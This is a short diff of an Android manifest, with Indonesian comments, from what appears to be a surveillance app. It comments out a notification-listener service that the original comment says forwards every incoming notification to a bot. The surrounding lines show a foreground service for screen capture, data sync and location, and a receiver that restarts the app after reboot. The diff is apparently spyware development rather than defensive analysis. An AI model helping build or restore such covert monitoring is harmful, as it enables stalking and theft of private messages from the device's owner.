@@ -45,7 +45,9 @@
             android:foregroundServiceType="mediaProjection|dataSync|location"
             android:exported="false" />
 
-        <!-- Notification listener: pantau semua notifikasi masuk, kirim ke bot -->
+        <!-- [DISABLED] Notification listener: dinonaktifkan sementara karena
+             memicu force-close. Aktifkan kembali dengan menghapus blok komentar di bawah. -->
+        <!--
         <service
             android:name=".NotificationWatcherService"
             android:exported="true"
@@ -55,6 +57,7 @@
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
+        -->
 
         <!-- Auto-restart service setelah device reboot -->
         <receiver
